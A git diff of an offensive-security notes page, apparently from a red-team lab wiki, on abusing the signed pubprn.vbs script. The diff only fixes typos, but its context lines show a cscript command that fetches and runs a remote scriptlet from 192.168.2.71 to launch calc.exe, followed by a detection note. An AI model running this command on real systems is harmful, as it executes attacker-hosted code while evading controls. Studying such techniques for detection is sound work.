@@ -8,7 +8,7 @@ description: >-
 
 ## Execution
 
-Using pubprn.vbs, we will execute code to launch a calc.exe. First of, the xml that will be executed by the script:
+Using pubprn.vbs, we will execute code to launch calc.exe. First of, the xml that will be executed by the script:
 
 {% code-tabs %}
 {% code-tabs-item title="http://192.168.2.71/tools/mitre/proxy-script/proxy.sct" %}
@@ -37,7 +37,7 @@ Using pubprn.vbs, we will execute code to launch a calc.exe. First of, the xml t
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@victim" %}
-```bash
+```csharp
 cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http://192.168.2.71/tools/mitre/proxy-script/proxy.sct
 ```
 {% endcode-tabs-item %}
@@ -51,7 +51,7 @@ Calc.exe gets spawned by cscript.exe which immediately closes leaving the calc.e
 
 ![](../.gitbook/assets/pubprn-ancestry.png)
 
-Monitoring commandlines can give be useful in detecting the script being abused:
+Monitoring commandlines can be useful in detecting the script being abused:
 
 ![](../.gitbook/assets/pubprn-logs.png)
 
